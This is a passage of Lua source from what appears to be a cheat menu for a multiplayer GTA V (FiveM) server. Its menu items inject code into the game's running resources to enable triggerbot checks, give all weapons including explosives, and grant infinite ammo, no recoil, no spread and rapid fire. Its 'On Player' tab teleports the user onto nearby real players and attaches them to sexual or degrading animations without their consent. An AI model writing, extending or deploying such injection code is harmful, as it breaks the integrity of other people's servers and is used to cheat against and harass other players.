                                _G.junkieTriggerbot.invisibleCheck = %s
                            ]], tostring(c)))
                        end
                    },
                    {
                        type = "checkbox",
                        label = "Dead Check",
                        checked = true,
                        onConfirm = function(c)
                            injectCode('monitor', string.format([[
                                _G.junkieTriggerbot = _G.junkieTriggerbot or {}
                                _G.junkieTriggerbot.deadCheck = %s
                            ]], tostring(c)))
                        end
                    },
                    {
                        type = "checkbox",
                        label = "Distance Check",
                        checked = true,
                        onConfirm = function(c)
                            injectCode('monitor', string.format([[
                                _G.junkieTriggerbot = _G.junkieTriggerbot or {}
                                _G.junkieTriggerbot.distCheck = %s
                            ]], tostring(c)))
                        end
                    },
                    {
                        type = "slider",
                        label = "Max Distance",
                        min = 1,
                        max = 500,
                        value = 250,
                        step = 5,
                        onConfirm = function(val)
                            injectCode('monitor', string.format([[
                                _G.junkieTriggerbot = _G.junkieTriggerbot or {}
                                _G.junkieTriggerbot.maxDist = %s
                            ]], tostring(val)))
                            showNotify("Trigger max distance: " .. val, "info")
                        end
                    },
                }
            }
        }
    },
    {
        label = 'Emotes',
        icon = 'ph-smiley',
        type = 'submenu',
        tabs = {
            {
                name = 'Self',
                submenu = {
                    {
                        type = 'button',
                        label = 'Stop Animations',
                        onConfirm = function()
                            injectCode('monitor', [[
                                SafeRunNative(ClearPedTasksImmediately, PlayerPedId())
                                SafeRunNative(DetachEntity, PlayerPedId(), false, false)
                            ]])
                        end
                    },
                    { type = 'divider', label = 'Dances' },
                    {
                        type = 'button',
                        label = 'Stripper Dance',
                        onConfirm = function()
                            injectCode('monitor', [[
                                PlayAnim(PlayerPedId(), 'mini@strip_club@private_dance@part1', 'priv_dance_p1', 8.0, -8.0, -1, 1, 0, false, false, false)
                            ]])
                        end
                    },
                    {
                        type = 'button',
                        label = 'Pole Dance',
                        onConfirm = function()
                            injectCode('monitor', [[
                                PlayAnim(PlayerPedId(), 'mini@strip_club@pole_dance@pole_dance1', 'pd_dance_01', 8.0, -8.0, -1, 1, 0, false, false, false)
                            ]])
                        end
                    },
                    { type = 'divider', label = 'Extras' },
                    {
                        type = 'button',
                        label = 'Facepalm',
                        onConfirm = function()
                            injectCode('monitor', [[
                                PlayAnim(PlayerPedId(), 'anim@mp_player_intcelebrationmale@face_palm', 'face_palm', 8.0, -8.0, -1, 1, 0, false, false, false)
                            ]])
                        end
                    },

                    {
                        type = 'button',
                        label = 'Tased',
                        onConfirm = function()
                            injectCode('monitor', [[
                                PlayAnim(PlayerPedId(), 'ragdoll@human', 'electrocute', 8.0, -8.0, -1, 1, 0, false, false, false)
                            ]])
                        end
                    },
                    {
                        type = 'button',
                        label = 'Piss',
                        onConfirm = function()
                            injectCode('monitor', [[
                                PlayAnim(PlayerPedId(), 'misscarsteal2peeing', 'peeing_loop', 8.0, -8.0, -1, 1, 0, false, false, false)
                            ]])
                        end
                    },
                    {
                        type = 'button',
                        label = 'Jerk Off',
                        onConfirm = function()
                            injectCode('monitor', [[
                                PlayAnim(PlayerPedId(), 'mp_player_int_upperwank', 'mp_player_int_wank_01', 8.0, -8.0, -1, 49, 0, false, false, false)
                            ]])
                        end
                    },
                    {
                        type = 'button',
                        label = 'Give Head',
                        onConfirm = function()
                            injectCode('monitor', [[
                                PlayAnim(PlayerPedId(), 'mini@prostitutes@sexnorm_veh', 'bj_loop_prostitute', 8.0, -8.0, -1, 1, 0, false, false, false)
                            ]])
                        end
                    },
                    {
                        type = 'button',
                        label = 'Shower',
                        onConfirm = function()
                            injectCode('monitor', [[
                                PlayAnim(PlayerPedId(), 'mp_safehouseshower@male@', 'male_shower_idle_b', 8.0, -8.0, -1, 1, 0, false, false, false)
                            ]])
                        end
                    },
                    {
                        type = 'button',
                        label = 'Suicide',
                        onConfirm = function()
                            injectCode('monitor', [[
                                PlayAnim(PlayerPedId(), 'mp_suicide', 'pistol', 8.0, -8.0, -1, 1, 0, false, false, false)
                            ]])
                        end
                    },
                }
            },
            {
                name = 'On Player',
                submenu = {
                    {
                        type = 'button',
                        label = 'Stop Animations',
                        onConfirm = function()
                            injectCode('monitor', [[
                                SafeRunNative(ClearPedTasksImmediately, PlayerPedId())
                                SafeRunNative(DetachEntity, PlayerPedId(), false, false)
                            ]])
                        end
                    },
                    {
                        type = 'button',
                        label = 'Slap',
                        onConfirm = function()
                            local selfCoords = GetEntityCoords(PlayerPedId())
                            local nearest, nearestDist = nil, math.huge
                            for _, pid in ipairs(GetActivePlayers()) do
                                if pid ~= PlayerId() then
                                    local ped = GetPlayerPed(pid)
                                    if ped and ped > 0 and DoesEntityExist(ped) then
                                        local d = #(selfCoords - GetEntityCoords(ped))
                                        if d < nearestDist then nearestDist = d; nearest = GetPlayerServerId(pid) end
                                    end
                                end
                            end
                            if not nearest then showNotify('No nearby players!', 'error') return end
                            injectCode('monitor', string.format([[
                                local selfPed = PlayerPedId()
                                local targetPed = GetPlayerPed(GetPlayerFromServerId(%d))
                                if not targetPed or targetPed <= 0 then return end
                                SafeRunNative(SetEntityHeading, selfPed, GetEntityHeading(targetPed) - 180.0)
                                SafeRunNative(SetEntityCoords, selfPed, GetOffsetFromEntityInWorldCoords(targetPed, 0.0, -0.5, 0.0))
                                PlayAnim(selfPed, 'melee@unarmed@streamed_variations', 'plyr_takedown_rear_lefthook', 8.0, -8.0, 1000, 0, 0, false, false, false)
                            ]], nearest))
                        end
                    },
                    {
                        type = 'button',
                        label = 'Hug',
                        onConfirm = function()
                            local selfCoords = GetEntityCoords(PlayerPedId())
                            local nearest, nearestDist = nil, math.huge
                            for _, pid in ipairs(GetActivePlayers()) do
                                if pid ~= PlayerId() then
                                    local ped = GetPlayerPed(pid)
                                    if ped and ped > 0 and DoesEntityExist(ped) then
                                        local d = #(selfCoords - GetEntityCoords(ped))
                                        if d < nearestDist then nearestDist = d; nearest = GetPlayerServerId(pid) end
                                    end
                                end
                            end
                            if not nearest then showNotify('No nearby players!', 'error') return end
                            injectCode('monitor', string.format([[
                                local selfPed = PlayerPedId()
                                local targetPed = GetPlayerPed(GetPlayerFromServerId(%d))
                                if not targetPed or targetPed <= 0 then return end
                                SafeRunNative(SetEntityHeading, selfPed, GetEntityHeading(targetPed) - 180.0)
                                SafeRunNative(SetEntityCoords, selfPed, GetOffsetFromEntityInWorldCoords(targetPed, 0.0, -0.5, 0.0))
                                PlayAnim(selfPed, 'mp_ped_interaction', 'hugs_guy_a', 8.0, -8.0, -1, 1, 0, false, false, false)
                            ]], nearest))
                        end
                    },
                    {
                        type = 'button',
                        label = 'Piggyback',
                        onConfirm = function()
                            local selfCoords = GetEntityCoords(PlayerPedId())
                            local nearest, nearestDist = nil, math.huge
                            for _, pid in ipairs(GetActivePlayers()) do
                                if pid ~= PlayerId() then
                                    local ped = GetPlayerPed(pid)
                                    if ped and ped > 0 and DoesEntityExist(ped) then
                                        local d = #(selfCoords - GetEntityCoords(ped))
                                        if d < nearestDist then nearestDist = d; nearest = GetPlayerServerId(pid) end
                                    end
                                end
                            end
                            if not nearest then showNotify('No nearby players!', 'error') return end
                            injectCode('monitor', string.format([[
                                local selfPed = PlayerPedId()
                                local targetPed = GetPlayerPed(GetPlayerFromServerId(%d))
                                if not targetPed or targetPed <= 0 then return end
                                SafeRunNative(AttachEntityToEntity, selfPed, targetPed, 4103, 0.0, 0.0, 0.7, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                                PlayAnim(selfPed, 'anim@arena@celeb@flat@paired@no_props@', 'piggyback_c_player_b', 8.0, -8.0, -1, 33, 0, false, false, false)
                            ]], nearest))
                        end
                    },
                    {
                        type = 'button',
                        label = 'Sit On',
                        onConfirm = function()
                            local selfCoords = GetEntityCoords(PlayerPedId())
                            local nearest, nearestDist = nil, math.huge
                            for _, pid in ipairs(GetActivePlayers()) do
                                if pid ~= PlayerId() then
                                    local ped = GetPlayerPed(pid)
                                    if ped and ped > 0 and DoesEntityExist(ped) then
                                        local d = #(selfCoords - GetEntityCoords(ped))
                                        if d < nearestDist then nearestDist = d; nearest = GetPlayerServerId(pid) end
                                    end
                                end
                            end
                            if not nearest then showNotify('No nearby players!', 'error') return end
                            injectCode('monitor', string.format([[
                                local selfPed = PlayerPedId()
                                local targetPed = GetPlayerPed(GetPlayerFromServerId(%d))
                                if not targetPed or targetPed <= 0 then return end
                                SafeRunNative(AttachEntityToEntity, selfPed, targetPed, 31086, 0.0, 0.0, 0.2, 0.0, 0.0, 180.0, false, false, false, false, 2, true)
                                PlayAnim(selfPed, 'anim@heists@prison_heistunfinished_biztarget_idle', 'target_idle', 8.0, -8.0, -1, 33, 0, false, false, false)
                            ]], nearest))
                        end
                    },
                    {
                        type = 'button',
                        label = 'Piss On',
                        onConfirm = function()
                            local selfCoords = GetEntityCoords(PlayerPedId())
                            local nearest, nearestDist = nil, math.huge
                            for _, pid in ipairs(GetActivePlayers()) do
                                if pid ~= PlayerId() then
                                    local ped = GetPlayerPed(pid)
                                    if ped and ped > 0 and DoesEntityExist(ped) then
                                        local d = #(selfCoords - GetEntityCoords(ped))
                                        if d < nearestDist then nearestDist = d; nearest = GetPlayerServerId(pid) end
                                    end
                                end
                            end
                            if not nearest then showNotify('No nearby players!', 'error') return end
                            injectCode('monitor', string.format([[
                                local selfPed = PlayerPedId()
                                local targetPed = GetPlayerPed(GetPlayerFromServerId(%d))
                                if not targetPed or targetPed <= 0 then return end
                                SafeRunNative(SetEntityHeading, selfPed, GetEntityHeading(targetPed))
                                SafeRunNative(SetEntityCoords, selfPed, GetOffsetFromEntityInWorldCoords(targetPed, 0.0, 0.5, 0.0))
                                PlayAnim(selfPed, 'misscarsteal2peeing', 'peeing_loop', 8.0, -8.0, -1, 1, 0, false, false, false)
                            ]], nearest))
                        end
                    },
                    {
                        type = 'button',
                        label = 'Twerk On',
                        onConfirm = function()
                            local selfCoords = GetEntityCoords(PlayerPedId())
                            local nearest, nearestDist = nil, math.huge
                            for _, pid in ipairs(GetActivePlayers()) do
                                if pid ~= PlayerId() then
                                    local ped = GetPlayerPed(pid)
                                    if ped and ped > 0 and DoesEntityExist(ped) then
                                        local d = #(selfCoords - GetEntityCoords(ped))
                                        if d < nearestDist then nearestDist = d; nearest = GetPlayerServerId(pid) end
                                    end
                                end
                            end
                            if not nearest then showNotify('No nearby players!', 'error') return end
                            injectCode('monitor', string.format([[
                                local selfPed = PlayerPedId()
                                local targetPed = GetPlayerPed(GetPlayerFromServerId(%d))
                                if not targetPed or targetPed <= 0 then return end
                                SafeRunNative(AttachEntityToEntity, selfPed, targetPed, 4103, 0.05, 0.38, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                                PlayAnim(selfPed, 'switch@trevor@mocks_lapdance', '001443_01_trvs_28_idle_stripper', 8.0, -8.0, -1, 33, 0, false, false, false)
                            ]], nearest))
                        end
                    },
                    {
                        type = 'button',
                        label = 'Fuck',
                        onConfirm = function()
                            local selfCoords = GetEntityCoords(PlayerPedId())
                            local nearest, nearestDist = nil, math.huge
                            for _, pid in ipairs(GetActivePlayers()) do
                                if pid ~= PlayerId() then
                                    local ped = GetPlayerPed(pid)
                                    if ped and ped > 0 and DoesEntityExist(ped) then
                                        local d = #(selfCoords - GetEntityCoords(ped))
                                        if d < nearestDist then nearestDist = d; nearest = GetPlayerServerId(pid) end
                                    end
                                end
                            end
                            if not nearest then showNotify('No nearby players!', 'error') return end
                            injectCode('monitor', string.format([[
                                local selfPed = PlayerPedId()
                                local targetPed = GetPlayerPed(GetPlayerFromServerId(%d))
                                if not targetPed or targetPed <= 0 then return end
                                SafeRunNative(AttachEntityToEntity, selfPed, targetPed, 4103, 0.04, -0.4, 0.1, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                                PlayAnim(selfPed, 'rcmpaparazzo_2', 'shag_loop_a', 8.0, -8.0, -1, 33, 0, false, false, false)
                            ]], nearest))
                        end
                    },
                    {
                        type = 'button',
                        label = 'Fake Arrest',
                        onConfirm = function()
                            local selfCoords = GetEntityCoords(PlayerPedId())
                            local nearest, nearestDist = nil, math.huge
                            for _, pid in ipairs(GetActivePlayers()) do
                                if pid ~= PlayerId() then
                                    local ped = GetPlayerPed(pid)
                                    if ped and ped > 0 and DoesEntityExist(ped) then
                                        local d = #(selfCoords - GetEntityCoords(ped))
                                        if d < nearestDist then nearestDist = d; nearest = GetPlayerServerId(pid) end
                                    end
                                end
                            end
                            if not nearest then showNotify('No nearby players!', 'error') return end
                            injectCode('monitor', string.format([[
                                local selfPed = PlayerPedId()
                                local targetPed = GetPlayerPed(GetPlayerFromServerId(%d))
                                if not targetPed or targetPed <= 0 then return end
                                SafeRunNative(AttachEntityToEntity, selfPed, targetPed, 4103, 0.35, 0.38, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                                PlayAnim(selfPed, 'mp_arresting', 'idle', 8.0, -8.0, -1, 49, 0, false, false, false)
                            ]], nearest))
                        end
                    },
                    {
                        type = 'button',
                        label = 'Dance On',
                        onConfirm = function()
                            local selfCoords = GetEntityCoords(PlayerPedId())
                            local nearest, nearestDist = nil, math.huge
                            for _, pid in ipairs(GetActivePlayers()) do
                                if pid ~= PlayerId() then
                                    local ped = GetPlayerPed(pid)
                                    if ped and ped > 0 and DoesEntityExist(ped) then
                                        local d = #(selfCoords - GetEntityCoords(ped))
                                        if d < nearestDist then nearestDist = d; nearest = GetPlayerServerId(pid) end
                                    end
                                end
                            end
                            if not nearest then showNotify('No nearby players!', 'error') return end
                            injectCode('monitor', string.format([[
                                local selfPed = PlayerPedId()
                                local targetPed = GetPlayerPed(GetPlayerFromServerId(%d))
                                if not targetPed or targetPed <= 0 then return end
                                SafeRunNative(SetEntityHeading, selfPed, GetEntityHeading(targetPed))
                                SafeRunNative(SetEntityCoords, selfPed, GetOffsetFromEntityInWorldCoords(targetPed, 0.0, 1.0, 0.0))
                                PlayAnim(selfPed, 'anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity', 'hi_dance_facedj_09_v1_male^6', 8.0, -8.0, -1, 1, 0, false, false, false)
                            ]], nearest))
                        end
                    },
                    {
                        type = 'button',
                        label = 'Fuck You',
                        onConfirm = function()
                            local selfCoords = GetEntityCoords(PlayerPedId())
                            local nearest, nearestDist = nil, math.huge
                            for _, pid in ipairs(GetActivePlayers()) do
                                if pid ~= PlayerId() then
                                    local ped = GetPlayerPed(pid)
                                    if ped and ped > 0 and DoesEntityExist(ped) then
                                        local d = #(selfCoords - GetEntityCoords(ped))
                                        if d < nearestDist then nearestDist = d; nearest = GetPlayerServerId(pid) end
                                    end
                                end
                            end
                            if not nearest then showNotify('No nearby players!', 'error') return end
                            injectCode('monitor', string.format([[
                                local selfPed = PlayerPedId()
                                local targetPed = GetPlayerPed(GetPlayerFromServerId(%d))
                                if not targetPed or targetPed <= 0 then return end
                                SafeRunNative(SetEntityHeading, selfPed, GetEntityHeading(targetPed))
                                SafeRunNative(SetEntityCoords, selfPed, GetOffsetFromEntityInWorldCoords(targetPed, 0.0, 1.0, 0.0))
                                PlayAnim(selfPed, 'anim@mp_player_intupperfinger', 'idle_a', 8.0, -8.0, -1, 49, 0, false, false, false)
                            ]], nearest))
                        end
                    },
                    {
                        type = 'button',
                        label = 'Pole Dance On',
                        onConfirm = function()
                            local selfCoords = GetEntityCoords(PlayerPedId())
                            local nearest, nearestDist = nil, math.huge
                            for _, pid in ipairs(GetActivePlayers()) do
                                if pid ~= PlayerId() then
                                    local ped = GetPlayerPed(pid)
                                    if ped and ped > 0 and DoesEntityExist(ped) then
                                        local d = #(selfCoords - GetEntityCoords(ped))
                                        if d < nearestDist then nearestDist = d; nearest = GetPlayerServerId(pid) end
                                    end
                                end
                            end
                            if not nearest then showNotify('No nearby players!', 'error') return end
                            injectCode('monitor', string.format([[
                                local selfPed = PlayerPedId()
                                local targetPed = GetPlayerPed(GetPlayerFromServerId(%d))
                                if not targetPed or targetPed <= 0 then return end
                                SafeRunNative(AttachEntityToEntity, selfPed, targetPed, 4103, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                                PlayAnim(selfPed, 'mini@strip_club@pole_dance@pole_dance1', 'pd_dance_01', 8.0, -8.0, -1, 1, 0, false, false, false)
                            ]], nearest))
                        end
                    },
                }
            },
        },
    },
    {
        label = 'Weapon',
        icon = 'ph-sword',
        type = 'submenu',
        tabs = {
            {
                name = 'Spawner',
                submenu = {
                    {
                        label = "Give All Weapons",
                        type = "button",
                        onConfirm = function()
                            local allWeapons = {
                                "weapon_unarmed", "weapon_knife", "weapon_dagger", "weapon_bat", "weapon_bottle",
                                "weapon_crowbar", "weapon_golfclub", "weapon_hammer", "weapon_hatchet", "weapon_machete",
                                "weapon_switchblade", "weapon_nightstick", "weapon_wrench",
                                "weapon_pistol", "weapon_pistol_mk2", "weapon_combatpistol", "weapon_appistol",
                                "weapon_stungun", "weapon_pistol50", "weapon_snspistol", "weapon_heavypistol",
                                "weapon_vintagepistol", "weapon_flaregun",
                                "weapon_microsmg", "weapon_smg", "weapon_smg_mk2", "weapon_assaultsmg",
                                "weapon_machinepistol", "weapon_minismg", "weapon_combatpdw",
                                "weapon_assaultrifle", "weapon_assaultrifle_mk2", "weapon_carbinerifle",
                                "weapon_carbinerifle_mk2", "weapon_advancedrifle", "weapon_specialcarbine",
                                "weapon_bullpuprifle", "weapon_gusenberg", "weapon_compactrifle",
                                "weapon_bullpuprifle_mk2", "weapon_marksmanrifle",
                                "weapon_pumpshotgun", "weapon_pumpshotgun_mk2", "weapon_sawnoffshotgun",
                                "weapon_assaultshotgun", "weapon_bullpupshotgun", "weapon_heavyshotgun",
                                "weapon_autoshotgun",
                                "weapon_sniperrifle", "weapon_heavysniper", "weapon_heavysniper_mk2",
                                "weapon_marksmanrifle_mk2",
                                "weapon_grenade", "weapon_stickybomb", "weapon_molotov", "weapon_pipebomb",
                                "weapon_proxmine", "weapon_rpg", "weapon_grenadelauncher", "weapon_minigun",
                                "weapon_firework",
                                "weapon_mg", "weapon_combatmg", "weapon_railgun", "weapon_hominglauncher",
                                "weapon_compactlauncher",
                                "weapon_ball", "weapon_flare", "weapon_smokegrenade", "weapon_bzgas", "weapon_petrolcan"
                            }

                            for _, weapon in ipairs(allWeapons) do
                                spawnWeaponByName(weapon:upper(), 9999)
                            end

                            showNotify("All weapons given", "success")
                        end
                    },
                    {
                        label = "Remove All Weapons",
                        type = "button",
                        onConfirm = function()
                            injectCode('any', [[
                                local selfPed = PlayerPedId()
                                SafeRunNative(RemoveAllPedWeapons, selfPed, true)
                            ]])

                            showNotify('All weapons removed', 'success')
                        end
                    },
                    {
                        label = "Remove Gun From Hand",
                        type = "button",
                        onConfirm = function()
                            injectCode('any', [[
                                local selfPed = PlayerPedId()
                                local weapon = SafeRunNative(GetSelectedPedWeapon, selfPed)

                                SafeRunNative(RemoveWeaponFromPed, weapon, wep)
                            ]])

                            showNotify("Current weapon removed", "success")
                        end
                    },
                    {
                        label = "Spawn weapon by name",
                        type = "button",
                        onConfirm = function()
                            showInput('Weapon Name', '', function(val)
                                if val and val ~= "" then
                                    spawnWeaponByName(val, 255)
                                    showNotify("Spawned: " .. val, "success")
                                end
                            end)
                        end
                    },
                    { type = 'divider', label = 'Other' },
                    {
                        label = "Melee",
                        type = "scroll",
                        selected = 1,
                        options = {
                            { label = "Unarmed", value = "weapon_unarmed" }, { label = "Knife", value = "weapon_knife" }, { label = "Dagger", value = "weapon_dagger" }, { label = "Bat", value = "weapon_bat" }, { label = "Bottle", value = "weapon_bottle" }, { label = "Crowbar", value = "weapon_crowbar" }, { label = "Golfclub", value = "weapon_golfclub" }, { label = "Hammer", value = "weapon_hammer" }, { label = "Hatchet", value = "weapon_hatchet" }, { label = "Machete", value = "weapon_machete" }, { label = "Switchblade", value = "weapon_switchblade" }, { label = "Nightstick", value = "weapon_nightstick" }, { label = "Wrench", value = "weapon_wrench" }
                        },
                        onConfirm = function(data)
                            local weaponModel = data.value
                            spawnWeaponByName(weaponModel, 255)
                            showNotify("Spawned: " .. weaponModel, "success")
                        end
                    },
                    {
                        label = "Handguns",
                        type = "scroll",
                        selected = 1,
                        options = {
                            { label = "Pistol", value = "weapon_pistol" }, { label = "Pistol Mk2", value = "weapon_pistol_mk2" }, { label = "Combat Pistol", value = "weapon_combatpistol" }, { label = "AP Pistol", value = "weapon_appistol" }, { label = "Stun Gun", value = "weapon_stungun" }, { label = "Pistol .50", value = "weapon_pistol50" }, { label = "SNS Pistol", value = "weapon_snspistol" }, { label = "Heavy Pistol", value = "weapon_heavypistol" }, { label = "Vintage Pistol", value = "weapon_vintagepistol" }, { label = "Flare Gun", value = "weapon_flaregun" }
                        },
                        onConfirm = function(data)
                            local weaponModel = data.value
                            spawnWeaponByName(weaponModel, 255)
                            showNotify("Spawned: " .. weaponModel, "success")
                        end
                    },
                    {
                        label = "SMGs",
                        type = "scroll",
                        selected = 1,
                        options = {
                            { label = "Micro SMG", value = "weapon_microsmg" }, { label = "SMG", value = "weapon_smg" }, { label = "SMG Mk2", value = "weapon_smg_mk2" }, { label = "Assault SMG", value = "weapon_assaultsmg" }, { label = "Machine Pistol", value = "weapon_machinepistol" }, { label = "Mini SMG", value = "weapon_minismg" }, { label = "Combat PDW", value = "weapon_combatpdw" }
                        },
                        onConfirm = function(data)
                            local weaponModel = data.value
                            spawnWeaponByName(weaponModel, 255)
                            showNotify("Spawned: " .. weaponModel, "success")
                        end
                    },
                    {
                        label = "Rifles",
                        type = "scroll",
                        selected = 1,
                        options = {
                            { label = "Assault Rifle", value = "weapon_assaultrifle" }, { label = "Assault Rifle Mk2", value = "weapon_assaultrifle_mk2" }, { label = "Carbine Rifle", value = "weapon_carbinerifle" }, { label = "Carbine Rifle Mk2", value = "weapon_carbinerifle_mk2" }, { label = "Advanced Rifle", value = "weapon_advancedrifle" }, { label = "Special Carbine", value = "weapon_specialcarbine" }, { label = "Bullpup Rifle", value = "weapon_bullpuprifle" }, { label = "Gusenberg", value = "weapon_gusenberg" }, { label = "Compact Rifle", value = "weapon_compactrifle" }, { label = "Bullpup Rifle Mk2", value = "weapon_bullpuprifle_mk2" }, { label = "Marksman Rifle", value = "weapon_marksmanrifle" }
                        },
                        onConfirm = function(data)
                            local weaponModel = data.value
                            spawnWeaponByName(weaponModel, 255)
                            showNotify("Spawned: " .. weaponModel, "success")
                        end
                    },
                    {
                        label = "Shotguns",
                        type = "scroll",
                        selected = 1,
                        options = {
                            { label = "Pump Shotgun", value = "weapon_pumpshotgun" }, { label = "Pump Shotgun Mk2", value = "weapon_pumpshotgun_mk2" }, { label = "Sawed-Off Shotgun", value = "weapon_sawnoffshotgun" }, { label = "Assault Shotgun", value = "weapon_assaultshotgun" }, { label = "Bullpup Shotgun", value = "weapon_bullpupshotgun" }, { label = "Heavy Shotgun", value = "weapon_heavyshotgun" }, { label = "Auto Shotgun", value = "weapon_autoshotgun" }
                        },
                        onConfirm = function(data)
                            local weaponModel = data.value
                            spawnWeaponByName(weaponModel, 255)
                            showNotify("Spawned: " .. weaponModel, "success")
                        end
                    },
                    {
                        label = "Snipers",
                        type = "scroll",
                        selected = 1,
                        options = {
                            { label = "Sniper Rifle", value = "weapon_sniperrifle" }, { label = "Heavy Sniper", value = "weapon_heavysniper" }, { label = "Heavy Sniper Mk2", value = "weapon_heavysniper_mk2" }, { label = "Marksman Rifle", value = "weapon_marksmanrifle" }, { label = "Marksman Rifle Mk2", value = "weapon_marksmanrifle_mk2" }
                        },
                        onConfirm = function(data)
                            local weaponModel = data.value
                            spawnWeaponByName(weaponModel, 255)
                            showNotify("Spawned: " .. weaponModel, "success")
                        end
                    },
                    {
                        label = "Explosives",
                        type = "scroll",
                        selected = 1,
                        options = {
                            { label = "Grenade", value = "weapon_grenade" }, { label = "Sticky Bomb", value = "weapon_stickybomb" }, { label = "Molotov", value = "weapon_molotov" }, { label = "Pipe Bomb", value = "weapon_pipebomb" }, { label = "Proximity Mine", value = "weapon_proxmine" }, { label = "RPG", value = "weapon_rpg" }, { label = "Grenade Launcher", value = "weapon_grenadelauncher" }, { label = "Minigun", value = "weapon_minigun" }, { label = "Firework", value = "weapon_firework" }
                        },
                        onConfirm = function(data)
                            local weaponModel = data.value
                            spawnWeaponByName(weaponModel, 255)
                            showNotify("Spawned: " .. weaponModel, "success")
                        end
                    },
                    {
                        label = "Heavy",
                        type = "scroll",
                        selected = 1,
                        options = {
                            { label = "MG", value = "weapon_mg" }, { label = "Combat MG", value = "weapon_combatmg" }, { label = "Gusenberg", value = "weapon_gusenberg" }, { label = "Minigun", value = "weapon_minigun" }, { label = "Grenade Launcher", value = "weapon_grenadelauncher" }, { label = "Railgun", value = "weapon_railgun" }, { label = "Homing Launcher", value = "weapon_hominglauncher" }, { label = "Compact Launcher", value = "weapon_compactlauncher" }
                        },
                        onConfirm = function(data)
                            local weaponModel = data.value
                            spawnWeaponByName(weaponModel, 255)
                            showNotify("Spawned: " .. weaponModel, "success")
                        end
                    },
                    {
                        label = "Throwables",
                        type = "scroll",
                        selected = 1,
                        options = {
                            { label = "Ball", value = "weapon_ball" }, { label = "Flare", value = "weapon_flare" }, { label = "Smoke Grenade", value = "weapon_smokegrenade" }, { label = "BZ Gas", value = "weapon_bzgas" }, { label = "Petrol Can", value = "weapon_petrolcan" }
                        },
                        onConfirm = function(data)
                            local weaponModel = data.value
                            spawnWeaponByName(weaponModel, 255)
                            showNotify("Spawned: " .. weaponModel, "success")
                        end
                    },
                    addonWeaponsScrollItem
                }
            },
            {
                name = 'Extra',
                submenu = {
                    {
                        type = "scroll",
                        label = "Weapon Animations",
                        selected = 1,
                        autoConfirm = true,
                        options = {
                            { label = "Default",       value = "Default" },
                            { label = "Hillbilly",     value = "Hillbilly" },
                            { label = "GangFemale",    value = "GangFemale" },
                            { label = "Gang1H",        value = "Gang1H" },
                            { label = "MP_F_Freemode", value = "MP_F_Freemode" }
                        },
                        onConfirm = function(data)
                            local value = data.value
                            injectCode('any', string.format([[
                                SafeRunNative(SetWeaponAnimationOverride, setPed, GetHashKey('%s'))
                            ]], value))
                        end
                    },
                    {
                        type = "checkbox",
                        label = "Infinite Ammo",
                        checked = false,
                        onConfirm = function(checked)
                            injectCode('monitor', string.format([[
                                InfiniteAmmo = %s

                                SafeRunNative(CreateThread, function()
                                    while InfiniteAmmo do
                                        local selfPed = PlayerPedId()
                                        SafeRunNative(SetAmmoInClip, selfPed, GetSelectedPedWeapon(selfPed), 1)

                                        Wait(0)
                                    end
                                end)
                            ]], checked))
                        end
                    },
                    {
                        type = "checkbox",
                        label = "No Reload",
                        checked = false,
                        onConfirm = function(checked)
                            injectCode('monitor', string.format([[
                                NoReload = %s

                                SafeRunNative(CreateThread, function()
                                    while NoReload do
                                        local selfPed = PlayerPedId()
                                        if IsPedShooting(selfPed) then
                                            SafeRunNative(PedSkipNextReloading, selfPed)
                                            SafeRunNative(MakePedReload, selfPed)
                                        end

                                        Wait(0)
                                    end
                                end)
                            ]], checked))
                        end
                    },
                    {
                        type = "checkbox",
                        label = "No Recoil",
                        checked = false,
                        onConfirm = function(checked)
                            injectCode('monitor', string.format([[
                                NoRecoil = %s

                                SafeRunNative(CreateThread, function()
                                    while NoRecoil do
                                        local selfPed = PlayerPedId()
                                        local weapon = GetSelectedPedWeapon(selfPed)

                                        SafeRunNative(SetWeaponRecoilShakeAmplitude, weapon, 0.0)
                                        
                                        Wait(0)
                                    end
                                end)
                            ]], checked))
                        end
                    },
                    {
                        type = "checkbox",
                        label = "No Spread",
                        checked = false,
                        onConfirm = function(checked)
                            injectCode('monitor', string.format([[
                                NoSpread = %s

                                SafeRunNative(CreateThread, function()
                                    while NoSpread do
                                        local selfPed = PlayerPedId()
                                        SafeRunNative(SetWeaponAccuracySpread, selfPed, 0.0)

                                        Wait(0)
                                    end
                                end)
                            ]], checked))
                        end
                    },
                    {
                        type = "checkbox",
                        label = "Rapid Fire",
                        checked = false,
                        onConfirm = function(checked)
                            injectCode('monitor', string.format([[
                                RapidFire = %s

                                SafeRunNative(CreateThread, function()
                                    while RapidFire do
                                        function RotationToDirection(rotation)
                                            local adjustedRotation = vector3( (math.pi / 180) * rotation.x, (math.pi / 180) * rotation.y, (math.pi / 180) * rotation.z)
                                            local direction = vector3(-math.sin(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), math.cos(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), math.sin(adjustedRotation.x))
                                            return direction
                                        end

                                        local player = PlayerPedId()
                                        local _, weapon = GetCurrentPedWeapon(player)
                                        
                                        if SafeRunNative(IsControlPressed, 0, 24) then
                                            local cameraCoord = GetFinalRenderedCamCoord()
                                            local cameraRot = GetFinalRenderedCamRot(0)
                                            local direction = RotationToDirection(cameraRot)
                                            local endCoords = vector3(cameraCoord.x + (direction.x * 1000.0), cameraCoord.y + (direction.y * 1000.0), cameraCoord.z + (direction.z * 1000.0))
                                            
                                            local ray = StartExpensiveSynchronousShapeTestLosProbe(cameraCoord.x, cameraCoord.y, cameraCoord.z, endCoords.x, endCoords.y, endCoords.z, -1, player, 0)
                                            local _, hit, hitCoords = GetShapeTestResult(ray)
                                            
                                            local targetPos = hit and hitCoords or endCoords
                                            local weaponObj = GetCurrentPedWeaponEntityIndex(player)
                                            local muzzleCoords = GetEntityCoords(weaponObj)

                                            for i = 1,2 do 
                                                SafeRunNative(ShootSingleBulletBetweenCoords, muzzleCoords.x, muzzleCoords.y, muzzleCoords.z, targetPos.x, targetPos.y, targetPos.z, 1, true, weapon, player, true, false, -1.0)
                                            end
                                        end

                                        Wait(0)
                                    end
                                end)
                            ]], checked))
                        end
                    },
                    {
                        type = "checkbox",
                        label = 'Invisible Weapon',
                        checked = false,
                        onConfirm = function(checked)
                            if checked then
                                injectCode('monitor', [[
                                    InvisibleWeaponThread = true
